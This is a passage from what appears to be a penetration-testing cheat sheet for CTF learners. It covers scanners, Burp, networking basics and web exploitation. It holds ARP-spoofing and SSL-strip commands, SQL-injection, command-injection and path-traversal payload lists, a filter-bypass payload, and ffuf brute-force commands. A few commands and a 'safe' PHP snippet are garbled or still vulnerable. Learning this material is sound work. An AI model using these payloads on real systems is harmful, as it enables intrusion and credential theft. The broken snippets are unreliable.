[Nikto 2](https://cirt.net/Nikto2) or nikto is a popular web scanning tool that allows users to find common web vulnerabilities. It is commonly used to check for common CVE's such as shellshock, and to get general information about the web server that you're enumerating.

### Syntax
`nikto -h <ip> -port <port>`

### A list of most useful flags:
`-h` Hostname/IP adress  
`-port` Specify ports  
`-nossl` Disable ssl  
`-ssl` Force ssl  
`-id` Specify authentication(username & password)  
`-plugin` Select which plugin to use  
`-update` Update the plugin list  
`--list-plugins`  List all possible plugins to use   
`-output` Output fingerprinted information to a file
## Nmap

[Nmap](https://nmap.org) is a utility for network discovery and security auditing.
> Note, there is now a better and much faster alternative to nmap called [rustscan](https://github.com/RustScan/RustScan). See more about it [here](/More/Nmap/README.md#rustscan).

### Syntax
`nmap [options] [ip]`  

Example:  
`nmap -sT -T4 -A -p- 172.162.39.86`  

### A list of most useful switches:
TCP scan (Most likely to be filtered)= `-sT`  
TCP Syn Scan (No logging)= `-sS`  
UDP scan (Slow)= `-sU`  

ICMP Scanning (host discovery, no port scans) = `-sn`  
Default ping scanning) = `-sP`  
Detect OS = `-O`  
Detect version of services = `-sV`  
Scan with the default nmap scripts = `-sC`  
Disable host discovery and just scan for open ports = `-Pn`  
ARP Scan (only on same subnet as target) = `-PR`  
Change verbosity = `-v`  
Change verbosity level two = `-vv` (It's good practice to *always* increase the verbosity in your scans.)  

Save nmap results in three major formats = `-oA [filename] [target]`  
Save nmap results in a text file = `-oN [filename] [target]`  
Save nmap results in grepable format = `-oG [filename] [target]`  

Aggresive mode (Enable OS detection, version detection, script scanning, and traceroute) = `-A`  
Timing leves (Speed of scans, can make errors) = `-T<Level>` (0-5)  
Port scan (specific)= `-p <port>`   
Port scan (range) = `-p <from>-<to>`  
Port scan (all) = `-p-`  
Activate a script= `—-script=<script_name>`   
Decoy an ip adress, [learn more](/More/Nmap/README.md#decoys) =  `-D`  
Fast mode = `-F`
Only open ports = `--open`   
List of hosts to scan = `-iL`  
No DNS lookup = `-n`  
Reverse DNS lookup = `-R`

Scan an IPv6 address = `-6` 

Subnet mask with 255.255.255.0 = `<ip>/24`
## RustScan
[RustScan](https://github.com/RustScan/RustScan) is a fast and extensible port scanner written in Rust. See [more](/More/Nmap/README.md#rustscan).

### Syntax
`rustscan -a 127.0.0.1 -p 53,80,121,65535`

**Options**  
`-a` A list of comma separated CIDRs, IPs, or hosts to be scanned  
`-b <size>` Batch size for parallel scanning (default 4500)  
`-p <port1>,<port2>` A list of commaseperated ports.  
`-r <range>` Specify range of ports (ex. 1-1000)  
`--scripts <script>` Run scripts  
`-t <timeout>` Timeout in milliseconds to consider port closed (default 1500)    
`--tries <tries>` Number of tries to consider port closed (default 1)  
`-q` Quiet mode. 

> Note: RustScan, at the moment, runs Nmap by default. So you can also specify commsnds like `-sC` and `-A`.
## SQLMap
[SQLMap](http://sqlmap.org) is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. 

### Syntax
`sqlmap <option> <url>`

### Options
`-u` - URL to test for SQL injection  
`-g` - Google Dork to test for SQL injection  
`-p` - Parameter to test for SQL injection  
`-D` - Dump a specific database to enumerate    
`-T` - Dump a specific table to enumerate   
`-C` - Dump specific columns to enumerate   
`--level` - Level of tests to perform (1-5)  
`--dbms` - Force SQLMap to use a specific DBMS  
`--dump` - Dump the contents of the database  
`--dump-all` - Dump all databases  
`--os-shell` - Get an OS shell  
`--batch` - Automatic run, won't ask for user input  
`--tables` - Dump all tables  
`--columns` - Dump all columns  
`--threads` - Number of threads to use  
`--level` - Level of tests to perform (1-5 def: 1)  
`--risk` - Risk of tests to perform (1-3 def: 1)  
`--dbs` - List databases  
`--technique` - Specify a technique to use 

(B: Boolean-based blind, E: Error-based, U: Union-based, S: Stacked queries, T: Time-based blind)  

SQLMap to try and bypass the WAF by using `--tamper=space2comment`

### Example use case
Test for SQL injection.
```bash
sqlmap.py -u <website> --dbs
```

Dumping some data inside columns from a table in a database.
List tables in a database.
```bash
sqlmap.py -u <website> -D <database_name> --tables
```

List columns in a table in a database.
```bash
sqlmap.py -u <website> -D <database_name> -T <table_name> --columns
```

Dump data from columns in a table in a database.
```bash
sqlmap.py -u <website> -D <database_name> -T <table_name> -C <column_name1>,<column_name2> -dump
```

# Tools (GUI) 
Graphical tools provide intuitive interfaces for complex security tasks. While CLI tools offer speed and automation, GUI tools excel at visualization, analysis, and collaborative work.

When to Use GUI Tools: 
- Complex data analysis and visualization
- Learning new concepts with visual feedback  
- Collaborative investigations where sharing screens helps
- Deep dive analysis requiring multiple perspectives

## Autopsy
Digital forensics platform that analyzes hard drives, smartphones, and other storage devices.

**Key Features:**
- File system analysis (NTFS, FAT, Ext2/3/4, HFS+)
- Deleted file recovery
- Timeline analysis
- Keyword searching
- Hash analysis (MD5, SHA1, SHA256)
- Email analysis
- Registry analysis (Windows)

**Common Workflow:**
1. Create new case
2. Add data source (disk image, drive, logical files)
3. Configure ingest modules (hash lookup, keyword search, etc.)
4. Analyze results in various views
5. Generate reports

**Supported Formats:**
- Raw/DD images
- E01 (EnCase)
- AFF (Advanced Forensic Format)
- VHD/VMDK (Virtual disks)

## Burp 
[Burp Suite](https://portswigger.net/burp), a framework of web application pentesting tools, is widely regarded as the de facto tool to use when performing web app testing

### Setting up Burp Suite
Download Burp Suite [here](https://portswigger.net/burp/communitydownload).  
Burp Suite requires Java JRE in order to run. Download and install Java [here](https://www.java.com/en/download/).

### Gettin' CA Certified
We need to install a CA certificate as BurpSuite acts as a proxy between your browser and sending it through the internet - It allows the BurpSuite Application to read and send on HTTPS data. 

1. Download [Foxy Proxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) in order to fully leverage the proxy, we'll have to install the CA certificate included with Burp Suite (otherwise we won't be able to load anything with SSL).
2. Now click on the extension -> Options -> Add -> Fill in the fields with the following values:  
   1. Title = Burp  
   2. Proxy type = HTTP  
   3. Proxy IP adress or DNS name = `127.0.0.1`  
   4. Port = `8080`  
   5. Username and password is optional.  
3. And hit save.  
4. Finally, click on the FoxyProxy extension icon again and select 'Burp'.
5. With Firefox, navigate to the following address: `http://localhost:8080`
6. Click on 'CA Certificate' in the top right to download and save the CA Certificate.
7. Now that we've downloaded the CA Certificate, move over to the settings menu in Firefox. Search for 'Certificates' in the search bar.
8. Click on 'View Certificates'. Next, in the Authorities tab click on 'Import' and then OK.

### Overview of Features
* **Proxy** - Burp Proxy allows us to intercept and modify requests/responses when interacting with web applications.
* **Target** - How we set the scope of our project. We can also use this to effectively create a site map of the application we are testing.
* **Intruder** - Incredibly powerful tool for everything from field fuzzing to credential stuffing and more
* **Repeater** - Allows us to capture, modify, then resend the same request numerous times. This feature can be absolutely invaluable, especially when we need to craft a payload through trial and error (e.g. in an SQLi -- Structured Query Language Injection) or when testing the functionality of an endpoint for flaws.
* **Sequencer** - Analyzes the 'randomness' present in parts of the web app which are intended to be unpredictable. This is commonly used for testing session cookies.
* **Decoder** - As the name suggests, Decoder is a tool that allows us to perform various transforms on pieces of data. These transforms vary from decoding/encoding to various bases or URL encoding.
* **Comparer** - Comparer as you might have guessed is a tool we can use to compare different responses or other pieces of data such as site maps or proxy histories (awesome for access control issue testing). This is very similar to the Linux tool diff.
* **Extender** - Similar to adding mods to a game like Minecraft, Extender allows us to add components such as tool integrations, additional scan definitions, and more!
* **Scanner** - Automated web vulnerability scanner that can highlight areas of the application for further manual investigation or possible exploitation with another section of Burp. This feature, while not in the community edition of Burp Suite, is still a key facet of performing a web application test.

### Benefits
1. Requests will by default require our authorization to be sent.
2. We can modify our requests in-line similar to what you might see in a man-in-the-middle attack and then send them on.
3. We can also drop requests we don't want to be sent. This can be useful to see the request attempt after clicking a button or performing another action on the website. 
4. And last but not least, we can send these requests to other tools such as Repeater and Intruder for modification and manipulation to induce vulnerabilities

### Notes
* URL Encode with Burp Suite: `Ctrl + U` to make a payload safe to send.
* Intruder attack types:
  * **Sniper**: Sends a single request to each selected item, typically used for targeted attacks. (e.g. a password bruteforce if we know the username)
  * **Battering ram**: Sends multiple identical requests to selected items, ideal for brute force attacks.
  * **Pitchfork**: Sends a combination of two payloads, one to the first item and another to the second item, useful for testing parameter-level vulnerabilities. (e.g. we know the username and password for a user)
  * **Cluster bomb**: Sends multiple payloads to each selected item, useful for discovering new vulnerabilities. (tries every combination of values)
* Python modules can be installed from the BApp Store, by downloading [Jython Jar file](https://www.jython.org/download) and placing it in the extender -> options -> python environment.
* Extensions can be created using the [Burp Extender API](https://portswigger.net/burp/extender/api) with either Java, Python or Ruby.

## Nessus
[Nessus](https://www.tenable.com/products/nessus) is a GUI based vulnerability scanner

### Download and installation
1. Click [here](https://www.tenable.com/products/nessus/nessus-essentials) and register an account.
2. Download the Nessus-#.##.#-debian6_amd64.deb file
3. Navigate to the download and run the following command: `sudo dpkg -i package_file.deb`
4. Start the nessus service wit the command: `sudo /bin/systemctl start nessusd.service` 
5. Open up Firefox and goto the following URL: `https://localhost:8834/` (Accept risk in case you get prompted)
6. Choose "Nessus Essentials" and click next. Skip when asked for a activation code
7. Login with your account
8. Wait for installation and then login again

### Navigation and Scans
Launch a scan = Hit the "New Scan"    
Side menu option that allows us to create custom templates = Policies    
Change plugin properties such as hiding them or changing their severity = Plugin rules  

### Scans
![Nessus Scans](Images/Nessus.png)

## Wireshark
[Wireshark](https://www.wireshark.org) is a tool used for creating and analyzing PCAPs (network packet capture files)  

Since this section is very large, I've created an individual page for this, which can be found inside this repository by clicking [here](More/Wireshark/README.md).


# Text Editors
## Nano
[Nano](https://nano-editor.org) is an easy to use command line text editor  

### Shortcuts
`^G` Display help text.  
`^O` Write the current file to disk  
`^X` Exit nano.  
`^T` Invoke spellc­heck, if installed.  
`^Y` Next screen.  
`^V` Previous screen.  
`^L` Refresh (force redraw) current screen.  
`^J` Justify current paragraph. (Join together broken lines of text until double newline is encoun­tered.)  
`^W` Search for a string or regular expres­sion.  
`^\` Search and replace a string or regular expres­sion  

## Vim
[Vim](https://www.vim.org) is a free and open-source, screen-based and highly customizable text editor program for Unix

### Modes
Generally speaking, there are three basic modes in Vim:

`Command mode` – allows you to run commands (Default).  
`Insert mode` – allows you to insert/write text.  
`Visual mode` – visual text selector.  

### Basic keybinds
`h` – move the cursor left  
`j` – cursor down  
`k` – cursor up  
`l` – move the cursor right  
`i` – enter the insert mode  
`esc` – enter the command mode  
`$` – move to the end of the line  
`yy` – copy a line  
`p` – paste  
`d` – delete a line  
`x` – cut a character  

### Basic commands:
`:q` – quit  
`:wq` – write & quit  
`:q!` – quit without saving  
`/word` – search for ‘word’ in the document  
`:vimgrep` – grep integration in Vim (allows to search in multiple files)

Find other very usefull commands [here](/More/VIM/README.md), or a full cheatsheet [here](https://vim.rtorr.com).

# Networking  
Networking fundamentals for cybersecurity. Understanding IP addresses, ports, and protocols is essential for security work.

## Internet Protocol (IP)
An IP address is like a postal address for devices on a network - it tells data where to go.

**Example**: `192.168.1.204`

### Key IP Address Types
```bash
# Private IP Ranges (not routable on internet)
10.0.0.0/8        # 10.0.0.0 - 10.255.255.255
172.16.0.0/12     # 172.16.0.0 - 172.31.255.255  
192.168.0.0/16    # 192.168.0.0 - 192.168.255.255

# Special Addresses in 192.168.1.x network
192.168.1.0       # Network address (first address)
192.168.1.1       # Default gateway (usually router)
192.168.1.255     # Broadcast address (last address)
```

Broadcast Address: Sending data here reaches ALL devices on the network (useful for discovery attacks).

### IPv4
IP addresses consists of 32 bits:   
11000000.10101000.00000001.11001100 = 192.168.1.204

Or in hex  
c0.a8.01.cc = 192.168.1.204

So a full IP address is made up by 8x4 bits(32-bits), where they are seperated by a dot after every 8 bits meaning there are 4 groups which is also called "octets". 

Since an octet consists of 8 bits and there are 4 octets, a valid IP address can only be a number between 0 and 255, meaning it can be 256 different numbers:  
(0-255).(0-255).(0-255).(0-255)

This makes the IP pool to have 2^32 = 4,294,967,296 different IP addresses that can be assigned.

## The router
A router assigns IP addresses to devices on a home network using a "pool" of addresses, ensuring no duplicates. This process, called **dynamic IP assignment**, uses the **DHCP** protocol. 

When a device wants to connect outside the network, it communicates through the **default gateway** (the router), typically **192.168.1.1**.

## IPv4 Classes
| Class | Range | Subnet | Number of networks | Usage | For |
|---|---|---|---|---|---|
| A | 1.0.0.0 - 126.255.255.255 | 255.0.0.0 | 16,777,214 | Host Assigning | Big Companies and Government |
| B | 128.0.0.0 - 191.255.20.0 | 255.255.0.0 | 65,534 | Host Assigning | Organizations |
| C | 192.0.0.0 - 223.255.255.0 | 255.255.255.0 | 254 | Host Assigning | Networks with few hosts |
| D | 224.0.0.0 - 239.255.255.255 |  |  | Special Purpose | Multicasting applications |
| E | 240.0.0.0. - 255.255.255.255 |  |  | Special Purpose | Experimental(Illegal) |

**Notes**  
- 127.0.0.0 is missing from the IP classes (16 million addresses) because they are loopback addresses on your local device. Normally used for network testing
- Class C gives us the the most networks and smaller hosts per network. 

## Subnetting
### Subnet mask
A subnet mask can look like this:  
255.255.255.0

If there is a 255, then the corresponding octet in the IP address will stay the same, but if the number is 0, then that octet can anything in between 0-255. Example:  
Subnet mask = **255.255.255**.0  
IP address = **192.168.1**.204

The first 3 octets of the IP address 192.168.1.* will stay the same where the last octet "*" in our case is 204, which in fact is valid since the number can be anything in between 0-255

So the octets that never change is called the "Network portion" where the octet on a subnet mask zero is called the "Host".

### IANA
IANA assigns IP addresses to a company. For example, IBM have the network range 9.0.0.0 which is a class A IP address. This gives the company the ability to slice up a network with another subnet mask, since the subnet mask for the Class A is only a default or a minimum they have to have. Example

IP = 9.1.4.0  
Subnet mask = 255.255.255.0  
= 256 other networks

The **Class A** network became a **Classless** network (when you cut up a network using a different subnet mask). Nowadays, we mainly do classles networks to take advantage of the IP addresses we need to use.

So in other words, big and massive networks can become into a smaller network. 

## Address Resolution Protocol (ARP)
Address Resolution Protocol (ARP) is a protocol or procedure that connects an ever-changing Internet Protocol (IP) address to a fixed physical machine address, also known as a media access control (MAC) address, in a local-area network (LAN)

So if the IP is known but the MAC adress is not, a request is broadcasted to every device on the network in order to match an IP address to its corresponding MAC address. This record is then maintained and saved to a table called ARP cache.

An ARP request contains the following information:
1. The senders IP address.
2. The senders MAC adress.
3. The IP address we want to learn the MAC address for.

### Dynamic and static records
When a broadcast is made, a dynamic record is made. This can be made by typing the following command:   
`arp-scan -l -I <interface>`

> `arp-scan` is a tool that can be used to scan for IP and MAC addresses on a local network. It can be installed with the command: `sudo apt install arp-scan`

> `sudo arp-scan -I eth0 -l` will send ARP queries for all valid IP addresses on the eth0 interface.

If we have the IP and MAC address values, a manual thus static record can be made. This is done with the command:  
`arp -s <IP_Address> <MAC_Address>`

See all ARP entries with the command:  
`arp -a`

### ARP Poisoning
Since it is possible to manually add entries to an ARP table, a few attack types can be made. These include:
1. Inflating the ARP cache thus making it non-responsive 
2. Change the traffic on a network in order to listen for a traffic coming from a target. (MitM)
3. Changing the traffic and completely stopping the traffic for a target device.

**Flushing an ARP cache**  
This can be made with the following command:  
`arp -s -s neigh flush all`

This command will delete every dynamic entry there is. The static ones will not be deleted since we added them manually. To remove the static entries run:   
`arp -d <IP_Address>`
### ARP Spoofing
ARP spoofing is a type of MITM (man-in-the-middle attack) in which a malicious actor sends falsified ARP (Address Resolution Protocol) messages over a local area network. This results in the linking of an attacker's MAC address with the IP address of a legitimate computer or server on the network.

<details>
<summary>ARP Spoofing with Bettercap</summary>

```bash
# Redirect flow
arpspoof -i <interface> -t <target_ip> <gateway_ip>
arpspoof -i <interface> -t <gateway_ip>

# Fool victim and gateway
echo 1 > /proc/sys/net/ipv4/ip_forward # Act as a router. 

# Boot up bettercap
bettercap -iface <interface>

# Start ARP spoofing
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets <target_ip>
arp.spoof on
net.sniff on

# Bypass HTTPS by downgrading it to HTTP
# SSL strip, and needs change
set net.sniff.local true
set net.recon on

# HSTS bypass
hstshijack/hstshijack # Works for websites using HTTPS and not HSTS
```

</details>

# Web Exploitation
Common web application vulnerabilities and how to exploit them.

## Content Discovery
Content discovery is divided into four parts, being manual, automated, OSINT and subdomain enumeration.

### Manual
1. Check the robots.txt file for disallowed/hiddenpages  
2. Check if there is /admin/ page
3. Check if there is any pages ( `~` and `.bak` and `.swp`
4. Check for git repositories /.git/. [GitTools](https://github.com/internetwache/GitTools) can be used in order to automatically scrape and download a git repository hosted online with a given URL.
5. Check favicon to find the website frameworks (only works if the website developer doesn't replace this with a custom one)  
Run this to find its md5 hash:  
`curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum`  
Check [this](https://wiki.owasp.org/index.php/OWASP_favicon_database) database to find the framework.
6. Check the sitemap file for disallowed/hidden files
7. Curl HTTP Headers to find potential information about the webserver software and possibly the programming/scripting language in use. `curl http://10.10.134.48 -v` The `-v` switch enables verbose mode, which will output the headers
8. Look out for cookie values and change them if possible. Look after Base64 encoded values, JWT tokens, or maybe case folded values that can be used to bypass authentication with simply using casefold(). (Example: 'ß' -> 'ss')
9. Test for Cross-site scripting
10. Test with SQL injection methods
11. Try Flask Template Injection (SSTI) with `{{config}}` in the url. If it works, try `{{ get_user_file("/etc/passwd") }}`
12. Check `.htaccess` file for apache server configurations.
13. Grab banners/headers for framework, authentication and misconfiguration discovery `curl -IL https://www.inlanefreight.com`
14. Check the source code for any comments or hidden information in the inspector view.

When successfully finding a framework using on of the methods, Framework Stacking can be used afterwards where you check the framework documentation for potential admin portals etc.

### Automated
**What is Automated Discovery?**  
Automated discovery is the process of using tools to discover content rather than doing it manually. This process is automated as it usually contains hundreds, thousands or even millions of requests to a web server. These requests check whether a file or directory exists on a website, giving us access to resources we didn't previously know existed. This process is made possible by using a resource called wordlists.

**What are wordlists?**  
Wordlists are just text files that contain a long list of commonly used words; they can cover many different use cases. For example, a password wordlist would include the most frequently used passwords, whereas we're looking for content in our case, so we'd require a list containing the most commonly used directory and file names.

**Most common Automation tools**   
`ffuf`, `dirb` and `gobuster`.   

Example use for all three tools:
```bash
$ ffuf -w <wordlist>:FUZZ -u <IP>/FUZZ
$ dirb http://<IP>
$ gobuster dir -u http://<IP> -w <wordlist>
```

### OSINT
**Google Hacking / Dorking**   
Google hacking / Dorking utilizes Google's advanced search engine features, which allow you to pick out custom content.  
| Filter | Example | Description |
|---|---|---|
| site | site:berkankutuk.dk | returns results only from the specified website address |
| inurl | inurl:admin | returns results that have the specified word in the URL |
| filetype | filetype:pdf | returns results which are a particular file extension |
| intitle | intitle:admin | returns results that contain the specified word in the title |  

Find many more operators [here](https://ahrefs.com/blog/google-advanced-search-operators/).

**Wappalyzer**  
Wappalyzer is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well. Read more [here](https://www.wappalyzer.com/).  

**Wayback Machine**  
The Wayback Machine is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website. Find the website [here](https://archive.org/web/).

**Email Harvesting**  
Email harvesting is the process of gathering email addresses from a website. This can be done manually by searching for email addresses in the source code of a website, or by using a tools such as [Hunter.io](https://hunter.io/) and [Phonebook](https://phonebook.cz/). In order to verify the email addresses, you can use [EmailHippo](https://tools.emailhippo.com/). 

### Subdomain enumeration

**SSL/TLS Certificates**  
When a Certificate Authority (CA) issues an SSL/TLS certificate, it logs it in public Certificate Transparency (CT) logs. These logs can be searched for current and historical certificates on sites like [crt.sh](crt.sh) .

**Search Engines**  
To search for subdomains of a domain:  
`-site:www.domain.com site:*.domain.com` 

**DNS Bruteforce**  
Bruteforce DNS (Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. For this method, the tool [DNSrecon](https://www.kali.org/tools/dnsrecon/), [Sublist3r](https://github.com/aboul3la/Sublist3r) or [Turbolist3r](https://github.com/fleetcaptain/Turbolist3r) can be used. A more modern but slower alternative is [Amass](https://github.com/owasp-amass/amass).

It is usually also a good idea to probe for HTTP and HTTPS services on the discovered subdomains to filter out any false positives. This can be done with the tool [httprobe](https://github.com/tomnomnom/httprobe).

**Virtual Hosts**  
Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their `/etc/hosts` file (or `c:\windows\system32\drivers\etc\hosts` file for Windows users) which maps domain names to IP addresses. 

Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can utilise this host header by making changes to it and monitoring the response to see if we've discovered a new website.

Bruteforce by using the following command:   
`ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: {domain}" -u http://{IP} -fs {size}`
### Cookie Manipulation
1. Check for JWT tokens at [JWT.io](https://jwt.io/)
2. Flask cookies can be unsigned by using the following tool [flask-unsign](https://pypi.org/project/flask-unsign/)
3. Flask cookies can be decoded/encoded using the following tool: [Flask Session Cookie Decoder/Encoder](https://github.com/noraj/flask-session-cookie-manager). See example usage [here](https://github.com/Berkanktk/CTFWriteups/tree/master/PicoCTF/Web%20Exploitation/MostCookies)
## SQL Injection
SQL (Structured Query Language) Injection occurs when user controlled input is passed to SQL queries without validation/sanitization. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. 

If an attacker is able to successfully pass input that is interpreted correctly, they would be able to do the following:

* Access, Modify and Delete information in a database when this input is passed into database queries. This would mean that an attacker can steal sensitive information such as personal details and credentials.
* Execute Arbitrary system commands on a server that would allow an attacker to gain access to users’ systems. This would enable them to steal sensitive data and carry out more attacks against infrastructure linked to the server on which the command is executed.

### SQL Injection Types
**In-band SQLi (Classic SQLi)**   
In-band SQLi is the most common and easy-to-exploit of SQL injection attacks. In-band SQLi attacks rely on the fact that the same communication channel is used for both the attack and the result. There are two types of in-band SQLi attacks:
  * **Error-based SQLi** - This type of SQL injection relies on error messages thrown by the database server to obtain information about the structure of the database. This information can then be used to formulate more attacks.
  * **Union-based SQLi** - This type of SQL injection relies on using the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.

**Inferential SQLi (Blind SQLi)**   
Inferential SQLi is also known as blind SQL injection. As the name suggests, the vulnerability itself is not directly present in the application but can be inferred from the behaviour of the application. There are two types of inferential SQLi attacks being:
  * **Boolean-based SQLi** - This type of SQL injection relies on sending SQL queries to the database which evaluate to either TRUE or FALSE. Depending on the result, the content within the HTTP response will change, or remain the same.
  * **Time-based SQLi** - This type of SQL injection relies on sending SQL queries to the database which cause a time delay in the response. The time delay is used to infer if the result of the query is TRUE or FALSE.


See much more database and SQLi related information [here](/More/Databases/).

### Tool for SQL Injection
[sqlmap](https://sqlmap.org/) is a tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. See how to use it [here](#SQLMap).

### Examples of SQL Injection
* `'' OR 1=1 --'`
* `' OR 1=1 --`
* `1' OR 1=1 --`
* `1' OR 1=1#`
* `1' OR 1=1--`
* `1' OR 1=1;--`
* `1" or "1"="1"-- -`
## Command Injection
Command injection is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with.

A command injection vulnerability is also known as a "Remote Code Execution" (RCE) because an attacker can trick the application into executing a series of payloads that they provide, without direct access to the machine itself (i.e. an interactive shell). The webserver will process this code and execute it under the privileges and access controls of the user who is running that application.  

### Discovering Command Injection
This vulnerability exists because applications often use functions in programming languages such as PHP, Python and NodeJS to pass data to and to make system calls on the machine’s operating system. For example, taking input from a field and searching for an entry into a file.

Example of a vulnerable code in PHP:  
```php
<?php
    $file = $_GET['file'];
    $command = "cat $file";
    system($command);
?>
```

Example of a vulnerable code in Python (Flask):  
```python
@app.route('/search')
def search():
    query = request.args.get('query')
    command = "grep -r " + query + " /var/www/html"
    output = subprocess.check_output(command, shell=True)
    return output
```

Command Injection can be detected in mostly one of two ways:
| Method | Description |
|:---:|---|
| Blind | This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviours of the application to determine whether or not your payload was successful. |
| Verbose | This type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the `whoami` command to see what user the application is running under. The web application will output the username on the page directly. |

**Detecting Blind Command Injection:**  
Use time-delay payloads like `ping` or `sleep` to test for injection by observing response delays. Another method is redirecting output using `>` (e.g., `whoami > file`) and then reading the file with `cat`.

The `curl` command is a great way to test for command injection. This is because you are able to use curl to deliver data to and from an application in your payload.  
```bash
curl http://vulnerable.app/process.php?search=The%20Beatles;whoami
```

**Detecting Verbose Command Injection:**  
This is easier to detect since the output of commands like `ping` or `whoami` is displayed directly on the web application.


### Exploiting Command Injection
Applications that use user input to populate system commands with data can often be combined in unintended behaviour. For example, the shell operators `;`, `&` and `&&` will combine two (or more) system commands and execute them bot

Useful payloads for command injection (linux):
| Payload | Description |
|:---:|:---:|
| whoami | See what user the application is running under. |
| ls | List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things. |
| ping | This command will invoke the application to hang. This will be useful in testing an application for blind command injection. |
| sleep | This is another useful payload in testing an application for blind command injection, where the machine does not have ping installed. |
| nc | Netcat can be used to spawn a reverse shell onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges. |

Useful payloads for command injection (windows):
| Payload | Description |
|:---:|:---:|
| whoami | See what user the application is running under. |
| dir | List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things. |
| ping | This command will invoke the application to hang. This will be useful in testing an application for blind command injection. |
| timeout | This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the ping command is not installed. |

Commands that quickly can be tested:
```bash
whoami
$(whoami)
| whoami
; whoami
' whoami
' || whoami
' & whoami
' && whoami
'; whoami
" whoami
" || whoami
" | whoami
" & whoami
" && whoami
"; whoami
$(`whoami`)
& whoami
&& whoami
```	

To test for a security misconfiguration in Python, we can use the `os` module to execute commands:
```python
import os; print(os.popen("ls -l").read())
```

When found `cat /etc/os-release` can be used to find the OS version and other useful information.

A useful tool in Windows we can use to gain RCE is `certutil.exe` (`certutil.exe -urlcache -f <url> <filename>`). This command is a native Windows CLI program installed as part of Certificate Services. It's handy in engagements because it is a binary signed by Microsoft and allows us to make HTTP/s connections. In our scenario, we can use it to make an HTTP request to download a file from a web server that we control to confirm that the command was executed.

See [this](https://github.com/payloadbox/command-injection-payload-list) cheatsheet for more.

### Remediating Command Injection
Command injection can be prevented in a variety of ways. Everything from minimal use of potentially dangerous functions or libraries in a programming language to filtering input without relying on a user’s input.

#### Vulnerable functions
In PHP, many functions interact with the operating system to execute commands via shell; these include:

* Exec
* Passthru
* System

Snippet for a code that only accept and process numbers between 0-9 as input:
```php
<input type="text" id="ping" name="ping" pattern="[0-9]+"</input>
<?php
echo passthru("/bin/ping -c 4 "$_GET["ping"]"); 
?>
```

#### Input sanitisation
Sanitising any input from a user that an application uses is a great way to prevent command injection. This is a process of specifying the formats or types of data that a user can submit. For example, an input field that only accepts numerical data or removes any special characters such as `>`, `&` and `/`.

```php
<?php
if (!filter_input (INPUT_GET, "number", FILTER_VALIDATE_NUMBER)) {
  ...
}
...
```

Read more about the function filter_input() [here](https://www.php.net/manual/en/function.filter-input.php).

#### Bypassing filters
Applications will employ numerous techniques in filtering and sanitising data that is taken from a  user's input. These filters will restrict you to specific payloads; however, we can abuse the logic behind an application to bypass these filters. For example, an application may strip out quotation marks; we can instead use the hexadecimal value of this to achieve the same result.

When executed, although the data given will be in a different format than what is expected, it can still be interpreted and will have the same result.

```php
$payload = "\x2f|\x65 \x74 \x63\x2f\x70\x61 \x73 \x73 \x77\x64"
```
## Directory Traversal
Directory traversal (also known as path traversal) allows attackers to access files and directories outside the web application's root directory.

**Common Payloads:**
```bash
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**Windows Examples:**
```bash
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
```

**Testing Methods:**
1. URL parameters: `file=../../../etc/passwd`
2. POST data: In form fields
3. HTTP headers: User-Agent, Cookie
4. File upload paths

**Files to Target:**
- Linux: `/etc/passwd`, `/etc/shadow`, `/proc/version`
- Windows: `C:\windows\system32\drivers\etc\hosts`, `C:\boot.ini`
- Application configs: `web.config`, `config.php`, `.env`
## Authentication Bypass
These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data.

### Username Enumeration
To find valid usernames, you can leverage error messages that reveal whether a username already exists. For example, using **ffuf**, you can automate testing with a wordlist of common usernames.

Example command:
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u <website_url> -mr "username already exists"
```

Options:
- `-w`: Specifies the wordlist path.
- `-X`: Sets the request method (`POST` in this case).
- `-d`: Defines form data with `FUZZ` placeholder for testing usernames.
- `-H`: Adds headers (e.g., `Content-Type`).
- `-u`: URL to send the request.
- `-mr`: Looks for specific response text to confirm a valid username.

### Brute Force

Brute force attacks try common passwords against usernames. After successful username enumeration, you can use the valid usernames for brute-forcing passwords.

Example command:
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <website_url> -fc 200
```

Options:
- `-w`: Specifies multiple wordlists (e.g., `W1` for usernames, `W2` for passwords).
- `-X`: Sets the request method (`POST` here).
- `-d`: Defines form data with `W1` for username and `W2` for password.
- `-H`: Adds headers (e.g., `Content-Type`).
- `-fc`: Filters responses by excluding status code `200`, indicating a failed login attempt.

### Logic Flaw
